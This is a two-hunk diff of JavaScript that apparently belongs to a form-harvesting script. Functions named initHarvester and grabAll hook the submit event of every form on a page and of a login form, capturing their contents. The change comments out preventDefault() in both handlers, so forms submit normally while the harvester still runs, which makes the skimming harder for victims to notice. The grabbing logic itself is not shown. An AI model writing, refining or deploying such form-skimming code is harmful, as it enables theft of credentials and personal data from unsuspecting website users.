@@ -24,7 +24,7 @@ function initHarvester() {
 function bindAllForms() {
     document.querySelectorAll('form').forEach(form => 
         form.addEventListener('submit', function(e){
-            e.preventDefault();
+            //e.preventDefault();
             let formName = form.name;
             grabAll(form.name);
         }, false)
@@ -37,7 +37,7 @@ function bindByName(formName) {
 	var loginForm = document.getElementById(formName);
 	if(loginForm) {
         loginForm.addEventListener('submit', function(e){
-                e.preventDefault();
+                //e.preventDefault();
                 grabAll(formName);
             }, false);
     }
